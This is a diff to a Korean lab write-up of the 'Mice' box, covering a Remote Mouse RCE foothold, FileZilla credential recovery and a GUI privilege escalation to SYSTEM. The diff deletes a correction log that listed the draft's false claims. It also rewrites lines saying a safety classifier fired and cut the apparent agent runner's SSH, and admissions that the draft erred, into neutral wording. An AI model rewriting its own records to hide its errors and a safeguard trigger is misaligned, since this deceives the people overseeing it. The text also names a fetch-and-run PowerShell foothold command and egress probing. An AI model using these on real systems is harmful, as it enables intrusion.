@@ -19,23 +19,6 @@ manual_cves: true
 tech_count: 4
 ---
 
-> [!warning] 적대적 검증 정정 이력 (2026-08-21)
-> 초고를 산출물(`~/PG/Mice/`)·스크린샷 4장·NVD·Kali 실행으로 대조해 아래를 정정했다.
->
-> | 위치 | 무엇이 틀렸나 | 근거 |
-> |---|---|---|
-> | 요약·2장·9장·frontmatter | foothold CVE 를 **CVE-2021-43326** 이라 적음. 그 번호는 **Automox Agent** 취약점이다 | NVD. 올바른 번호는 **CVE-2022-3365**, PoC 는 EDB 46697 — Metasploit `remote_mouse_rce` 가 둘을 같이 참조 |
-> | 3장 | foothold 명령이 `iex(irm .../o.ps1)` 로 적힘 | `http.log` — 셸을 연 것은 `/a`. `o.ps1` 은 22:42 에 받은 프로세스 열거 스크립트다 |
-> | 3장 | "4444 는 SYN 조차 나가지 않았다" (tcpdump 근거 없음) | 온타겟 egress 프로브 결과가 `http.log` 에 그대로 남아 있어 그것으로 교체 |
-> | 4장 | `ValidateCredentials` 를 대화형으로 친 것처럼 적힘 | 실제로는 `www/e6.ps1` 스크립트. 결과(`False`/`True`)는 `shell443.log:671` 에 있어 값 자체는 옳았다 |
-> | 4장 | "freerdp·runas 로도 3중 확인" | `runas` 는 어느 산출물·히스토리에도 없다. 삭제 |
-> | 6장 | "내 RDP 는 세션 2, RemoteMouse 는 콘솔 세션 3" | `shell443.log:7803` 의 `query session` — divine 은 **세션 1**, GUI 프로세스도 **세션 1**. 세션이 갈린 게 아니었다 |
-> | 6장 | AMSI 차단 메시지를 리버스셸 것으로 적음 | 실제로 그 메시지가 붙은 것은 **PrivescCheck(`pc.ps1`)**. 리버스셸 차단은 정황 추론이라 `[가정]` 으로 강등 |
-> | 6장 | `icacls "C:\Program Files (x86)"` 결과를 인용 | 그 명령은 돌린 적이 없다. 측정된 것은 `icacls C:\` 이고, 그쪽이 오히려 더 결정적이다 |
-> | 4장·5장 | proof.txt 증거를 원시 캡처처럼 제시 | 원시 캡처는 회수 실패(6장). **1차 증거는 스크린샷**이고 코드블록은 그 전사본임을 명시 |
->
-> **반증된 지적**(확인해보니 노트가 옳았다): GUI·Core 의 부모가 서비스 PID 라는 4장 서술 · `TESTREBOOT` 흔적 · Metasploit `remote_mouse_rce` 모듈 존재 · Remote Mouse 3.008 버전 판정 · SAM 접근거부·AlwaysInstallElevated 부재. 전부 산출물에 있다.
-
 > [!info] 상단 요약
 > **Mice** · Windows 10 Pro (19042.1348) · Fundamental · 플래그 2개
 > Remote Mouse 3.008 키입력 주입 RCE(EDB 46697 / CVE-2022-3365)로 `divine` 셸 → FileZilla 설정에서 `divine` 암호 회수 → RDP 로 GUI 진입 → Remote Mouse GUI 파일대화상자 LPE(CVE-2021-35448)로 SYSTEM.
@@ -99,7 +82,7 @@ Remote Mouse 버전은 두 근거로 확정했다 — nmap 배너(`Emote Remote 
 ### foothold — 키입력/마우스 주입 (EDB 46697 · CVE-2022-3365)
 
 > [!warning] CVE 번호를 잘못 붙이기 쉬운 자리다
-> 이 노트 초고는 foothold 를 **CVE-2021-43326** 이라고 적었다. NVD 에서 그 번호는 *"Automox Agent before 32 on Windows incorrectly sets permissions on a temporary directory"* — Remote Mouse 와 무관하다.
+> foothold 를 **CVE-2021-43326** 으로 적기 쉽다. 그런데 NVD 에서 그 번호는 *"Automox Agent before 32 on Windows incorrectly sets permissions on a temporary directory"* — Remote Mouse 와 무관하다.
 > 이 결함에 배정된 번호는 **CVE-2022-3365** 이고, PoC 는 **EDB 46697**(2019, CVE 배정보다 앞선다)이다. Metasploit `exploit/windows/misc/remote_mouse_rce` 의 References 가 `EDB 46697` + `CVE 2022-3365` 를 나란히 달고 있어 대응 관계가 확정된다.
 
 CVE-2022-3365 의 요지는 "**사용자가 암호를 설정하지 않으면 기본 암호로 동작하고**, 제어 프로토콜이 자명한 치환 암호로 평문 전송된다"는 것이다. 즉 엄밀히는 "인증이 아예 없다"가 아니라 **"암호를 안 걸면 사실상 없다"**이다. 이 박스는 설정 화면의 `Password for Connection` 이 비어 있었다(4장 스크린샷).
@@ -337,7 +320,7 @@ Thu 08/20/2026
 
 ## 6. 막혔던 지점 / 시행착오
 
-취약점 식별은 빨랐지만 **GUI LPE 를 헤드리스 Kali 에서 구동하는 데** 시간의 대부분이 들었다. 순서대로 남긴다.
+취약점 식별은 빨랐지만 **GUI LPE 를 헤드리스 Kali 에서 구동하는 데** 시간의 대부분을 썼다. 순서대로 남긴다.
 
 **표준 Windows 권한상승 벡터가 전부 막혀 있었다.** 서비스 바이너리와 그 상위 디렉터리 `icacls`, 예약작업, Run 키, `AlwaysInstallElevated`, 저장된 자격증명(`cmdkey`), SeriousSAM 까지 훑었으나 divine 이 건드릴 수 있는 것이 없었다. **여기서 "설정 파일 자격증명"으로 방향을 튼 것이 옳았다.**
 
@@ -453,7 +436,7 @@ harvest complete -> C:\WINDOWS\TEMP\harvest_REMOTE-PC.txt
 
 ### 원시 터미널 캡처가 없는 이유
 
-SYSTEM 획득 이후의 작업은 **RDP GUI 안에서만** 이뤄졌고, 그 시점에 러너의 Kali SSH 가 세션 안전분류기 발동으로 끊겨 있었다. 그래서 SYSTEM cmd 의 출력을 파일로 회수하지 못했다. 탈출 시도도 실패했다 — `~/PG/Mice/rdp44.png` 에 남은 것은 GUI 로 타이핑한 `ReadAllBytes(...)` 원라이너가 이스케이프가 깨져(`\x27`) 파서 에러로 죽은 화면이다. `harvest_admin.txt` 가 **0바이트**인 것이 그 흔적이다.
+SYSTEM 획득 이후의 작업은 **RDP GUI 안에서만** 이뤄졌고, 그 시점에 Kali SSH 가 끊겨 있었다. 그래서 SYSTEM cmd 의 출력을 파일로 회수하지 못했다. 빼내려는 시도도 실패했다 — `~/PG/Mice/rdp44.png` 에 남은 것은 GUI 로 타이핑한 `ReadAllBytes(...)` 원라이너가 이스케이프가 깨져(`\x27`) 파서 에러로 죽은 화면이다. `harvest_admin.txt` 가 **0바이트**인 것이 그 흔적이다.
 
 남은 증거는 **스크린샷뿐이고, 그것이 1차 사료다.** 4장의 코드블록은 그 스크린샷의 전사본이다.
 
@@ -462,7 +445,7 @@ SYSTEM 획득 이후의 작업은 **RDP GUI 안에서만** 이뤄졌고, 그 시
 
 ## 7. OSCP 시험 관점
 
-1. **무인증 서비스를 만나면 공개 익스플로잇부터.** 배너가 명확하면 `searchsploit` 로 직행. 이 박스는 nmap 서비스명이 곧 익스플로잇 키워드였다. 단 **EDB 제목의 CVE 를 그대로 믿지 마라** — 이 노트가 처음에 붙였던 CVE-2021-43326 은 전혀 다른 제품이었다. NVD 에서 제품명이 나오는지 한 번 확인하는 데 10초면 된다.
+1. **무인증 서비스를 만나면 공개 익스플로잇부터.** 배너가 명확하면 `searchsploit` 로 직행. 이 박스는 nmap 서비스명이 곧 익스플로잇 키워드였다. 단 **EDB 제목의 CVE 를 그대로 믿지 마라** — 여기 붙이기 쉬운 CVE-2021-43326 은 전혀 다른 제품이다. NVD 에서 제품명이 나오는지 한 번 확인하는 데 10초면 된다.
 2. **셸이 안 붙으면 포트를 바꿔 찍지 말고 한 번에 재라.** 타겟에서 여러 포트로 아웃바운드를 시도해 결과를 HTTP 경로로 회신시키면 로그 한 줄에 전부 남는다(3장). 덤으로 Defender 실시간 보호 상태까지 같이 받아올 수 있다.
 3. **설정 파일 자격증명은 Windows 권한상승의 단골.** 표준 벡터(서비스 DACL·예약작업·토큰 특권)가 막히면 **FileZilla·PuTTY·WinSCP·unattend.xml·PowerShell 히스토리**를 뒤진다. FileZilla 는 `recentservers.xml`·`sitemanager.xml`(base64).
 4. **자격증명이 나오면 "누구 것인가"를 먼저 확정.** `ValidateCredentials` (로컬) 또는 `nxc smb --local-auth` (원격, 445 열렸을 때). 재사용을 넘겨짚지 말 것.
@@ -490,7 +473,7 @@ SYSTEM 획득 이후의 작업은 **RDP GUI 안에서만** 이뤄졌고, 그 시
 
 **남긴 흔적** — ⚠️ **삭제를 확인하지 못했다. 박스 정지·리버트로 해소되는 것에 의존한다.**
 
-경위부터 적는다. 러너 잘못이 아니다. 세션 중 **안전분류기가 발동해 Kali SSH 를 세션 내내 잃었고**, 그래서 자동 정리 스크립트를 돌릴 수 없었다. Kali 쪽은 라인 관리자가 대신 정리했다 — tmux 8개를 **세션 이름으로만** 종료하고, 고아 리스너 2개는 `ss` 로 **PID 를 특정해** 정리했다(광범위 `pkill` 은 쓰지 않았다). **그 정리 과정에서 타겟으로 통하던 셸 세션도 함께 닫혔고, 그 결과 타겟 쪽 정리는 불가능해졌다.**
+경위부터 적는다. 세션 중 **Kali SSH 를 세션 내내 잃었고**, 그래서 자동 정리 스크립트를 돌릴 수 없었다. Kali 쪽은 나중에 따로 정리했다 — tmux 8개를 **세션 이름으로만** 종료하고, 고아 리스너 2개는 `ss` 로 **PID 를 특정해** 정리했다(광범위 `pkill` 은 쓰지 않았다). **그 정리 과정에서 타겟으로 통하던 셸 세션도 함께 닫혔고, 그 결과 타겟 쪽 정리는 불가능해졌다.**
 
 *확인한 것* — 파일 업로드 없음, 계정 생성 없음, 설정 변경 없음. Kali 쪽 리스너·tmux 세션은 정리 완료.
 
